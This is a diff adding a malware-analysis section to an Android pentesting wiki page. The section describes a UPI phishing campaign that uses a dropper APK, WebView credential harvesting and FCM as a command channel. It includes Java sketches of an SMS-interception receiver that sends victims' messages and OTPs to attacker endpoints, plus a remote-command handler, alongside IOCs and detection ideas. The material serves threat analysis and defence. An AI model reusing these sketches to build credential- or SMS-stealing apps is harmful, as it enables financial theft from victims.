@@ -90,9 +90,143 @@ Java.perform(function() {
 LubanCompress 1.1.8       # "Luban" string inside classes.dex
 ```
 
+---
+
+## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern
+
+This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.
+
+### Delivery chain across trusted platforms
+- YouTube video lure → description contains a short link
+- Shortlink → GitHub Pages phishing site imitating the legit portal
+- Same GitHub repo hosts an APK with a fake “Google Play” badge linking directly to the file
+- Dynamic phishing pages live on Replit; remote command channel uses Firebase Cloud Messaging (FCM)
+
+### Dropper with embedded payload and offline install
+- First APK is an installer (dropper) that ships the real malware at `assets/app.apk` and prompts the user to disable Wi‑Fi/mobile data to blunt cloud detection.
+- The embedded payload installs under an innocuous label (e.g., “Secure Update”). After install, both the installer and the payload are present as separate apps.
+
+Static triage tip (grep for embedded payloads):
+
+```bash
+unzip -l sample.apk | grep -i "assets/app.apk"
+# Or:
+zipgrep -i "classes|.apk" sample.apk | head
+```
+
+### Dynamic endpoint discovery via shortlink
+- Malware fetches a plain-text, comma-separated list of live endpoints from a shortlink; simple string transforms produce the final phishing page path.
+
+Example (sanitised):
+
+```
+GET https://rebrand.ly/dclinkto2
+Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
+Transform: "gate.html" → "gate.htm" (loaded in WebView)
+UPI credential POST: https://sqcepo.replit.app/addup.php
+SMS upload:           https://sqcepo.replit.app/addsm.php
+```
+
+Pseudo-code:
+
+```java
+String csv = httpGet(shortlink);
+String[] parts = csv.split(",");
+String upiPage = parts[0].replace("gate.html", "gate.htm");
+String smsPost = parts[1];
+String credsPost = upiPage.replace("gate.htm", "addup.php");
+```
+
+### WebView-based UPI credential harvesting
+- The “Make payment of ₹1 / UPI‑Lite” step loads an attacker HTML form from the dynamic endpoint inside a WebView and captures sensitive fields (phone, bank, UPI PIN) which are `POST`ed to `addup.php`.
+
+Minimal loader:
+
+```java
+WebView wv = findViewById(R.id.web);
+wv.getSettings().setJavaScriptEnabled(true);
+wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
+```
+
+### Self-propagation and SMS/OTP interception
+- Aggressive permissions are requested on first run:
+
+```xml
+<uses-permission android:name="android.permission.READ_CONTACTS"/>
+<uses-permission android:name="android.permission.SEND_SMS"/>
+<uses-permission android:name="android.permission.READ_SMS"/>
+<uses-permission android:name="android.permission.CALL_PHONE"/>
+```
+
+- Contacts are looped to mass-send smishing SMS from the victim’s device.
+- Incoming SMS are intercepted by a broadcast receiver and uploaded with metadata (sender, body, SIM slot, per-device random ID) to `/addsm.php`.
+
+Receiver sketch:
+
+```java
+public void onReceive(Context c, Intent i){
+  SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
+  for (SmsMessage m: msgs){
+    postForm(urlAddSms, new FormBody.Builder()
+      .add("senderNum", m.getOriginatingAddress())
+      .add("Message", m.getMessageBody())
+      .add("Slot", String.valueOf(getSimSlot(i)))
+      .add("Device rand", getOrMakeDeviceRand(c))
+      .build());
+  }
+}
+```
+
+### Firebase Cloud Messaging (FCM) as resilient C2
+- The payload registers to FCM; push messages carry a `_type` field used as a switch to trigger actions (e.g., update phishing text templates, toggle behaviours).
+
+Example FCM payload:
+
+```json
+{
+  "to": "<device_fcm_token>",
+  "data": {
+    "_type": "update_texts",
+    "template": "New subsidy message..."
+  }
+}
+```
+
+Handler sketch:
+
+```java
+@Override
+public void onMessageReceived(RemoteMessage msg){
+  String t = msg.getData().get("_type");
+  switch (t){
+    case "update_texts": applyTemplate(msg.getData().get("template")); break;
+    case "smish": sendSmishToContacts(); break;
+    // ... more remote actions
+  }
+}
+```
+
+### Hunting patterns and IOCs
+- APK contains secondary payload at `assets/app.apk`
+- WebView loads payment from `gate.htm` and exfiltrates to `/addup.php`
+- SMS exfiltration to `/addsm.php`
+- Shortlink-driven config fetch (e.g., `rebrand.ly/*`) returning CSV endpoints
+- Apps labelled as generic “Update/Secure Update”
+- FCM `data` messages with a `_type` discriminator in untrusted apps
+
+### Detection & defence ideas
+- Flag apps that instruct users to disable network during install and then side-load a second APK from `assets/`.
+- Alert on the permission tuple: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-based payment flows.
+- Egress monitoring for `POST /addup.php|/addsm.php` on non-corporate hosts; block known infrastructure.
+- Mobile EDR rules: untrusted app registering for FCM and branching on a `_type` field.
+
+---
+
 ## References
 
 - [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
 - [Luban – Android image compression library](https://github.com/Curzibn/Luban)
+- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
+- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
 
 {{#include ../../banners/hacktricks-training.md}}
